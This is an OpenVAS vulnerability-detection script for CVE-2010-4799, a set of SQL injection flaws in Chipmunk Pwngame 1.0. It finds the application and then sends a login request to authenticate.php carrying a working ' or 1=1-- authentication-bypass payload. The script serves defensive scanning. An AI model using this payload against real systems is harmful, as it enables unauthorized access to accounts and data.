##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_chipmunk_pwngame_mult_sql_inj_vuln.nasl 11997 2018-10-20 11:59:41Z mmartin $
#
# Chipmunk Pwngame Multiple SQL Injection Vulnerabilities
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902368");
  script_version("$Revision: 11997 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-20 13:59:41 +0200 (Sat, 20 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-05-11 15:50:14 +0200 (Wed, 11 May 2011)");
  script_cve_id("CVE-2010-4799");
  script_bugtraq_id(43906);
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_name("Chipmunk Pwngame Multiple SQL Injection Vulnerabilities");
  script_xref(name:"URL", value:"http://secunia.com/advisories/41760/");
  script_xref(name:"URL", value:"http://securityreason.com/exploitalert/9240");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 SecPod");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"insight", value:"Input passed via the 'username' parameter to 'authenticate.php'
  and 'ID' parameter to 'pwn.php' is not properly sanitised before being used in
  an SQL query.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"This host is running Chipmunk Pwngame and is prone multiple SQL
  injection vulnerabilities.");
  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to access or
  modify data, or exploit latent vulnerabilities in the underlying database or
  bypass the log-in mechanism.");
  script_tag(name:"affected", value:"Chipmunk Pwngame version 1.0");

  script_tag(name:"qod_type", value:"remote_app");
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");

cpPort = get_http_port(default:80);

foreach dir (make_list_unique("/pwngame", "/", cgi_dirs(port:cpPort)))
{

  if( dir == "/" ) dir = "";

  sndReq = http_get(item:string(dir, "/pwn.php"), port:cpPort);
  rcvRes = http_keepalive_send_recv(port:cpPort, data:sndReq);

  if(">Chipmunk Scripts<" >< rcvRes)
  {
    filename = dir + "/authenticate.php";
    host = http_host_name(port:cpPort);

    authVariables = "username=%27+or+1%3D1--+-H4x0reSEC&password=%27+or+1%3D1--" +
                    "+-H4x0reSEC&submit=submit";

    sndReq = string("POST ", filename, " HTTP/1.1\r\n",
                    "Host: ", host, "\r\n",
                    "Content-Type: application/x-www-form-urlencoded", "\r\n",
                    "Content-Length: ", strlen(authVariables), "\r\n\r\n",
                     authVariables);
    rcvRes = http_keepalive_send_recv(port:cpPort, data:sndReq);

    if(">Thanks for logging in" >< rcvRes && ">Main player Page<" >< rcvRes)
    {
      security_message(port:cpPort);
      exit(0);
    }
  }
}

exit(99);